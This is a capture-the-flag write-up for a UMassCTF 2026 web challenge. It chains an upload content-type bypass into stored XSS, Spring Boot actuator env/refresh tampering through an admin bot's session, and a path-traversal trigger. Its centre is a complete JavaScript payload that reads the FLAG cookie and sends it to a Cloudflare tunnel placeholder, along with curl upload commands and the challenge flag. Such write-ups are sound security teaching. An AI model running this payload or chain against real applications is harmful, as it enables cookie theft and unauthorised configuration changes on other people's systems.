# The Block City Times — UMassCTF 2026 (WEB)

## TL;DR
Multi-stage XSS: upload HTML as text/plain (served as text/html via extension), abuse editorial bot's admin session to flip Spring Boot actuator config to dev mode, trigger report-runner via path traversal, exfiltrate FLAG cookie through report-runner's internet-connected network.

## Architecture
- **app** (Spring Boot): web app on `web` + `editorial-net` networks
- **editorial** (Puppeteer): visits uploaded files as admin, `editorial-net` only (internal, no internet)
- **report-runner** (Puppeteer): sets FLAG cookie, visits configurable endpoint, on `web` + `editorial-net` (has internet)

## Vulnerabilities

### 1. Content-Type Mismatch (File Upload Bypass)
- Upload checks `file.getContentType()` (client-controlled) against allowlist: `text/plain`, `application/pdf`
- Serving uses `Files.probeContentType()` which checks file extension
- Upload `.html` file with `Content-Type: text/plain` → accepted → served as `text/html` → XSS

### 2. Spring Boot Actuator Env POST (CWE-15: External Control of System Configuration)
- `/actuator/env` POST enabled, changes runtime properties
- Actuator chain uses httpBasic but Spring Security shares session context — editorial bot's form-login session works
- Change `app.enforce-production=false` and `app.active-config=dev`, then `/actuator/refresh`

### 3. Path Traversal in Report Endpoint (CWE-22)
- `/admin/report` POST checks `endpoint.startsWith("/api/")`
- Path traversal: `/api/../files/UUID-exploit.html` passes the check
- Report-runner visits `http://app.internal:8080/api/../files/UUID-exploit.html` → normalized to `/files/UUID-exploit.html`

### 4. Network Topology Exploit
- Editorial bot (internal network) can't reach internet → direct XSS exfil impossible
- Report-runner is on BOTH internal and external networks → its Puppeteer CAN reach internet
- Chain: editorial XSS → triggers report-runner → report-runner's browser exfiltrates FLAG

## Attack Chain
```
1. Upload self-referencing HTML exploit (text/plain content-type, .html extension)
2. Editorial bot visits file as admin → XSS executes
3. XSS uses admin session to:
   a. POST /actuator/env → app.enforce-production=false
   b. POST /actuator/env → app.active-config=dev
   c. POST /actuator/refresh → apply changes
   d. GET /admin → extract CSRF token
   e. POST /admin/report → endpoint=/api/../files/UUID-exploit.html
4. App server-side calls report-runner:9001/report
5. Report-runner: login as admin, set FLAG cookie, visit our file
6. Same file detects FLAG cookie → exfiltrates to Cloudflare tunnel
```

## Exploit Payload
```html
<html><body><script>
(async()=>{
  const T="https://TUNNEL.trycloudflare.com";
  
  // Phase 2: Report-runner context - exfiltrate FLAG
  if(document.cookie.includes('FLAG')){
    new Image().src=T+"/flag?c="+encodeURIComponent(document.cookie);
    await new Promise(r=>setTimeout(r,3000));
    return;
  }
  
  // Phase 1: Editorial bot context - chain attack
  const base = window.location.origin;
  const myPath = window.location.pathname;
  
  // Disable enforce-production
  await fetch(base+'/actuator/env',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({name:'app.enforce-production',value:'false'})
  });
  
  // Switch to dev mode
  await fetch(base+'/actuator/env',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({name:'app.active-config',value:'dev'})
  });
  
  // Refresh Spring context
  await fetch(base+'/actuator/refresh',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:'{}'
  });
  
  // Get CSRF token
  let adminHtml = await (await fetch(base+'/admin')).text();
  let csrf = adminHtml.match(/name="_csrf"[^>]*value="([^"]+)"/)[1];
  
  // Trigger report with path traversal to our own file
  let endpoint = '/api/../files/' + myPath.split('/files/')[1];
  let form = new URLSearchParams();
  form.append('endpoint', endpoint);
  form.append('_csrf', csrf);
  
  await fetch(base+'/admin/report',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body: form.toString(),
    redirect:'manual'
  });
})();
</script></body></html>
```

## Upload Command
```bash
CSRF=$(curl -s -c cookies "$INST/submit" | grep -oP 'name="_csrf"[^>]*value="\K[^"]+' | head -1)
curl -s -b cookies "$INST/submit?_csrf=$CSRF" \
  -F "title=Story" -F "author=test" -F "description=news" \
  -F "file=@exploit.html;type=text/plain"
```

## Flag
```
UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}
```

## Key Lessons
- Content-Type check at upload vs serve time mismatch = classic XSS vector
- Spring Boot actuator `env` POST + `refresh` = runtime config manipulation
- Docker internal networks don't block all lateral movement — check which containers share networks
- Self-referencing payload (same file serves both stages) eliminates need to know UUID filenames
- Spring Security session context is shared across filter chains by default
